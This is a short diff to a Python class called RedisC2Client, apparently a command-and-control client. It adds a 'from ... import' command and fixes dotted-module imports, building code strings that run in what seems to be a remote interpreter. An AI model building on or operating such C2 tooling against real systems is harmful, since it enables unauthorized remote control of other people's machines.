@@ -76,11 +76,22 @@ class RedisC2Client:
     def handle_exit(self, args):
         raise SystemExit
 
+    def handle_from(self, args):
+        if len(args) < 3 or args.pop(1) != "import":
+            return print("usage: from MODULE import SYM [, SYM2]")
+        mod = args.pop(0)
+        symbols = [sym.strip() for sym in " ".join(args).split(",")]
+        self._requires(mod)
+        return ("globals().update(dict("
+                f"(sym,getattr({mod},sym)) for sym in {symbols}"
+                "))")
+
     def handle_import(self, args):
         if len(args) != 1:
             return print("usage: import MODULE")
         [mod] = args
-        return f"globals().update({{{mod!r}:__import__({mod!r})}})"
+        mod0 = mod.split(".", 1)[0]
+        return f"globals().update({{{mod0!r}:__import__({mod!r})}})"
 
     def handle_cd(self, args):
         if len(args) != 1:
@@ -116,7 +127,8 @@ class RedisC2Client:
 
     def _requires(self, *modules):
         for module in modules:
-            if self._exec(f"{module!r} in globals()") != "False":
+            mod0 = module.split(".", 1)[0]
+            if self._exec(f"{mod0!r} in globals()") != "False":
                 continue
             self._import(module)
 
